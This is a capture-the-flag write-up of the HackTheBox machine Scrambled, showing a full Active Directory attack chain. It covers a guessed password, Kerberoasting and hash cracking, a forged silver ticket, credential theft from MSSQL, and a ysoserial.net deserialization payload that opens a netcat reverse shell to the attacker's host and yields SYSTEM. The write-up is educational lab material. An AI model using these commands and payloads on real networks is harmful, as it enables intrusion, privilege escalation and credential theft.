---
layout: post
title: "The Ticket Was Always Yours"
subtitle: "HTB Scrambled, where a domain kills NTLM to stop relay attacks and accidentally builds an all-Kerberos kill chain, from a username-equals-password reset to a forged silver ticket to a .NET backdoor running as SYSTEM"
date: 2022-10-08 12:00:00 +0000
description: "Scrambled disables NTLM to dodge relay attacks, and every step of the box flows down the Kerberos pipe it opened instead."
image: /assets/og/the-ticket-was-always-yours.png
tags: [hackthebox, writeup]
---

Scrambled is a box that locked one door so hard it forgot the other one was a hallway. The admins read about NTLM relay attacks, got scared, and turned NTLM off across the whole domain. A reasonable, even admirable move. It also means every authentication on the machine now runs through Kerberos, and Kerberos is a system of tickets you can sometimes forge. So the path is a single straight line down the pipe they left open. A help desk that resets your password to your own username. A service account whose ticket cracks to a real password. A silver ticket minted from that password that walks you into the database. Credentials in a table that get you a file share. And in that share, a homegrown .NET app with a developer backdoor and a deserialization bug that hands you SYSTEM. Nobody picks a lock on Scrambled. They print the keys.

```
        S C R A M B L E D
        =================
        "we disabled NTLM (relay attacks!)"
                 |
                 v
        every login now rides kerberos.
        a ticket is a sealed envelope the
        server trusts because the seal looks right.

        we just learned to make the seal.
                 |
                 v
        username = password.  TGS cracks.  silver ticket.
        SQL spills a login.  the app deserializes us.
                                            鍵
```

## 0x01 · twenty doors, one rule

The `nmap` sweep comes back loud and unmistakably a domain controller. Twenty ports, and the spread tells the whole story before you touch any of them.

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec
389/tcp  open  ldap          Active Directory LDAP
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s      Microsoft SQL Server
4411/tcp open  unknown       SCRAMBLECORP_ORDERS
5985/tcp open  http          WinRM
```

Kerberos on 88, LDAP on 389, SMB on 445, MSSQL on 1433, and a custom service on 4411 calling itself `SCRAMBLECORP_ORDERS`. Hold that last one, it pays out at the very end. The website on 80 is a corporate IT page for Scramble Corp, and it does something most boxes are too shy to do. It tells you the rules. There is a notice that NTLM authentication has been disabled, specifically to stop relay attacks, and a support page explaining the password reset policy. Leave a message with your username, the page says, and we will reset your password to match your username. Then a support screenshot leaks a real one, `ksimpson`.

Three facts on one page, and they stack into a key. The username is `ksimpson`. The reset policy says the password equals the username. So the password is probably `ksimpson` too.

## 0x02 · the password that is just the name

Normally you would test that guess with a quick SMB login and a tool you have muscle memory for. Except those tools speak NTLM, and NTLM is off. This is the moment the box's whole design clicks into place. With NTLM disabled, you cannot just throw a username and password at the wire the old way. You have to ask the domain controller for a Kerberos ticket first, and prove who you are to the KDC, the ticket-granting authority, before anything else will talk to you.

Think of it like a building that stopped accepting walk-ins at the front desk. You cannot flash an ID at any individual office anymore. You go to one central booth, prove yourself once, and the booth prints you a wristband. After that every office just glances at the wristband. The booth is the KDC, and the wristband is a Kerberos ticket.

So you request a ticket-granting ticket for `ksimpson` using that username as the password, then point your tools at Kerberos with the `-k` flag instead of a password.

```
$ getTGT.py scrm.local/ksimpson:ksimpson -dc-ip dc1.scrm.local
[*] Saving ticket in ksimpson.ccache

$ KRB5CCNAME=ksimpson.ccache smbclient.py -k -no-pass dc1.scrm.local
# Public:  Network Security Changes.pdf
```

The guess holds. The reset policy was real, and `ksimpson:ksimpson` is a live account. The `Public` share hands you a PDF that proudly confirms what you already learned the hard way, NTLM is gone, the domain is Kerberos-only now. The defenders documented their own attack surface.

## 0x03 · the ticket that cracks

A domain account, even a weak one, is a flashlight you can shine into Active Directory. The move here is Kerberoasting, and it leans on a quiet feature of Kerberos that has aged badly. Any authenticated user is allowed to request a service ticket for any service account, and part of that ticket is encrypted with the service account's password. The KDC will hand it over without checking whether you have any business using that service. So you ask for the ticket, take it home, and grind it offline until the password falls out.

Picture a coat check that gives anyone a claim stub for any coat in the room, and the stub is stamped with a wax seal made from the owner's signature. You cannot wear the coat yet. But you can sit at home with the stub and guess at the signature for as long as you like, and nobody at the coat check ever knows you are trying.

`GetUserSPNs.py` requests the roastable tickets over Kerberos.

```
$ GetUserSPNs.py scrm.local/ksimpson:ksimpson -dc-host dc1.scrm.local -request -k
ServicePrincipalName        Name    
--------------------------  ------  
MSSQLSvc/dc1.scrm.local:1433  sqlsvc

$ hashcat -m 13100 sqlsvc.tgs rockyou.txt
...Pegasus60
```

One service principal comes back, `MSSQLSvc` running as the account `sqlsvc`. The ticket cracks against `rockyou.txt` to `Pegasus60`. That is the SQL service's password, in the clear.

## 0x04 · forging the seal

Here is where it gets elegant. You have the SQL service password, but the SQL service does not let you log in directly with it the normal way. So you do not log in. You forge the ticket the SQL server expects to receive, a technique called a silver ticket.

A normal Kerberos service ticket is encrypted with the service account's password, then sent to that service, which decrypts it and trusts whatever is inside, including a list of which groups you belong to. The catch nobody likes to say out loud is that the service never phones home to verify any of it. If you know the service account's password, you can build the ticket yourself, stuff it with a claim that you are the domain Administrator, encrypt it with that password, and the service will open it and believe every word.

Think of it like a wax seal again, but now you have stolen the stamp. A sealed letter is trusted because forging the seal was supposed to be impossible. Once the stamp is in your hand, you write your own letter, seal it, and the recipient honors it because the seal is genuine. The signature is real. The story inside is a lie.

Building it takes three pieces. The NTLM hash of `Pegasus60` because the ticket encryption wants the hash not the plaintext, the domain SID so the forged identity points at the real domain, and the service principal name so the ticket is addressed to the right service.

```
$ iconv -f ASCII -t UTF-16LE <(printf "Pegasus60") | openssl dgst -md4
b999a16500b87d17ec7f2e2a68778f05

$ ticketer.py -nthash b999a16500b87d17ec7f2e2a68778f05 \
    -domain-sid S-1-5-21-2743207045-1827831105-2542523200 \
    -domain scrm.local -spn MSSQLSvc/dc1.scrm.local:1433 administrator
[*] Saving ticket in administrator.ccache
```

That `.ccache` is a forged ticket claiming you are `administrator`, sealed with the genuine SQL service key. Present it to MSSQL and the server reads the seal, sees `administrator`, and rolls out the carpet.

```
$ KRB5CCNAME=administrator.ccache mssqlclient.py -k dc1.scrm.local
SQL> SELECT * FROM ScrambleHR.dbo.UserImport;
MiscSvc | ScrambledEggs9900 | scrm.local
```

A database called `ScrambleHR`, a table called `UserImport`, and sitting in it like a sticky note on a monitor, another set of credentials. `MiscSvc` with the password `ScrambledEggs9900`.

## 0x05 · the app that trusts its own mail

`MiscSvc` is a real domain user, so back to the shares. This account can reach an `IT` share that `ksimpson` could not, and inside are two files that change the game. A compiled .NET program, `ScrambleClient.exe`, and the library it leans on, `ScrambleLib.dll`. Recognize the names. This is the client for that `SCRAMBLECORP_ORDERS` service on port 4411 we parked four sections ago.

When a box hands you the actual binaries, you read them. Load the DLL into a .NET decompiler like dnSpy and the source reassembles itself from the compiled code, and two things jump out. First, a developer backdoor. The login routine has a hardcoded path where if the username is `scrmdev`, it skips password validation entirely. A side door someone built for testing and never tore out. Second, and worse, the app moves order objects across the wire by serializing them with `BinaryFormatter`.

That word `BinaryFormatter` is a fire alarm to anyone who has done this before. Serialization is just flattening a live object into a stream of bytes to send it somewhere. Deserialization is rebuilding the object on the other end. The trouble is that `BinaryFormatter` will faithfully rebuild whatever type of object the bytes describe, including objects whose mere act of being reconstructed runs code. Feed it a carefully shaped blob and the reconstruction itself becomes the payload.

Think of it like a flat-pack furniture kit. Normally the box contains parts and an instruction sheet that builds a chair. But the receiver follows any instruction sheet you ship it, no questions asked. So you mail a sheet whose step seven reads "now drill a hole in the wall and let the stranger in," and the assembler, trusting that the sheet came from the factory, picks up the drill.

You log in through the `scrmdev` backdoor to clear the front gate, then build the malicious furniture kit with `ysoserial.net`, the tool that knows exactly which premade chains of .NET objects detonate on deserialization.

```
$ ysoserial.exe -f BinaryFormatter -g AxHostState -o base64 \
    -c "C:\programdata\iceberg.exe 10.10.14.4 443 -e cmd.exe"
```

The `-c` payload is just [ a reverse shell calling a planted nc back to 10.10.14.4 on 443 ]. You hand that blob to the service over its `UPLOAD_ORDER` command on 4411, the server deserializes your fake order, and the assembly instructions run.

```
$ nc -lnvp 443
connect to [10.10.14.4] from dc1.scrm.local
C:\> whoami
nt authority\system
C:\> type C:\Users\Administrator\Desktop\root.txt
████████████████████████████████
```

Not a user. Not the SQL service. SYSTEM, because the order-processing service ran as SYSTEM and trusted the shape of the mail it received.

## 0x06 · the honest caveat

It would be easy to read Scrambled as a Kerberos box, file it under "go learn silver tickets," and move on. That misses the actual confession the machine is making. The defenders did something genuinely smart, they disabled NTLM to kill relay attacks, and relay attacks are a real and nasty problem. The lesson is not that they were wrong. The lesson is that turning off one protocol does not reduce your attack surface, it relocates it. Everything that used to flow through NTLM now flows through Kerberos, and Kerberos has its own soft spots. Kerberoastable service accounts with guessable passwords. Silver tickets for any service whose account key you can recover. You did not get around their decision. You walked single file down the exact path their decision created.

And every link in that chain is a person, not a zero-day. The help desk policy that sets your password to your own name. The service account with `Pegasus60` in `rockyou`. The credentials parked in plaintext in an HR table. The developer backdoor left in shipping code, and the long-deprecated `BinaryFormatter` still trusted to rebuild objects from a stranger. Microsoft has been warning against `BinaryFormatter` for years, and it processes untrusted input here anyway because it was easy and it worked in testing. None of these is exotic. They are the ordinary debts a real network carries, and Scrambled just lines them up so you can see how a chain is only as strong as its most convenient shortcut.

## 0x07 · outro

```
they nailed one door shut and called it security.
the hallway beside it was always open.

a name became a password. a password became a ticket.
a ticket became a forged seal the server could not doubt.
and the last service trusted the shape of a letter
        enough to assemble the knife inside it.

relocate the surface, don't shrink it. read the seal. wear black.

                                                            EOF
```

---

*HTB: Scrambled, retired 1 October 2022. A medium Windows box that is really a lecture on what happens when you disable one protocol and forget the other one is load-bearing. The seal still forges in a lab and nowhere you don't own.*